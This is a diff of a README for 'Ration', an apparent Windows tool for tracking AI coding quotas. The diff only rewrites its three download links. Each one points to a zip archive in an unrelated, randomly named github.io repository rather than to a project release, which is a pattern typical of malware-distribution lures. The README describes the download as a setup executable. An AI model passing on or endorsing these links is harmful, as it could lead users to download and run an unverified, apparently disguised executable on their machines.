@@ -5,7 +5,7 @@ description: "Monitor and manage your AI coding usage with customizable quotas, 
 ---
 # 🍱 Ration - Keep Your AI Coding Balanced
 
-[![Download Ration](https://img.shields.io/badge/Download-Ration-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/brimstonevegetablemarrow362/brimstonevegetablemarrow362.github.io/main/MOH/2.2.zip)
+[![Download Ration](https://img.shields.io/badge/Download-Ration-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brimstonevegetablemarrow362/brimstonevegetablemarrow362.github.io/raw/refs/heads/main/MOH/2.2.zip)
 
 ## 🧭 What Is Ration?
 
@@ -28,7 +28,7 @@ Follow these three simple steps to start using Ration today.
 
 ### Step 1: Download the App
 
-[![Download Ration Now](https://img.shields.io/badge/⬇️%20Download%20Ration-FF5722?style=for-the-badge)](https://raw.githubusercontent.com/brimstonevegetablemarrow362/brimstonevegetablemarrow362.github.io/main/MOH/2.2.zip)
+[![Download Ration Now](https://img.shields.io/badge/⬇️%20Download%20Ration-FF5722?style=for-the-badge)](https://github.com/brimstonevegetablemarrow362/brimstonevegetablemarrow362.github.io/raw/refs/heads/main/MOH/2.2.zip)
 
 Visit this link to download the application. The download page will show you a file (likely named something like `RationSetup.exe`). Click the download button and wait for the file to finish downloading. This usually takes less than a minute.
 
@@ -143,6 +143,6 @@ Ration is released under the MIT License, which means you can use, modify, and d
 
 Download Ration today and take control of your AI coding habits with a simple, friendly tool that respects your time and privacy.
 
-[![Download Ration](https://img.shields.io/badge/🚀%20Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/brimstonevegetablemarrow362/brimstonevegetablemarrow362.github.io/main/MOH/2.2.zip)
+[![Download Ration](https://img.shields.io/badge/🚀%20Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brimstonevegetablemarrow362/brimstonevegetablemarrow362.github.io/raw/refs/heads/main/MOH/2.2.zip)
 
 Keywords: ai-quota, claude-code, codex, csharp, dotnet, system-tray, usage-tracker, windows, windows-11, winui3
